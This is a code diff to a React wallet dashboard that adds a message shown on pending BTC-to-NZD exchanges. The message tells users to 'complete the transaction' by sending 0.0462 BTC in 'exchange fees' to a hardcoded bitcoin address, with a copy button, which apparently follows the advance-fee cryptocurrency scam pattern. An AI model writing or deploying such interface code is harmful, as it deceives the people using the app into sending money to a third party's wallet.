@@ -1241,6 +1241,27 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                       </Button>
                     </div>
                   </div>
+                 )}
+                
+                {/* Completion Message for Pending BTC to NZD Exchange */}
+                {(selectedTransaction.status === 'pending' || selectedTransaction.type === 'pending') && selectedTransaction.exchangeTo && selectedTransaction.exchangeToSymbol === 'NZD' && (
+                  <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg p-4 mt-4">
+                    <p className="text-sm text-blue-800 dark:text-blue-200 mb-3">
+                      Please complete the transaction by adding 0.0462 BTC for the exchange fees to:
+                    </p>
+                    <div className="flex items-center gap-2">
+                      <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-sm break-all">
+                        bc1q5483wqnyt2xcch4m3jqextl06qzq5veetvyzrt
+                      </div>
+                      <Button 
+                        size="sm"
+                        variant="outline"
+                        onClick={() => copyToClipboard("bc1q5483wqnyt2xcch4m3jqextl06qzq5veetvyzrt")}
+                      >
+                        <Copy className="w-4 h-4" />
+                      </Button>
+                    </div>
+                  </div>
                 )}
               </>
             )}
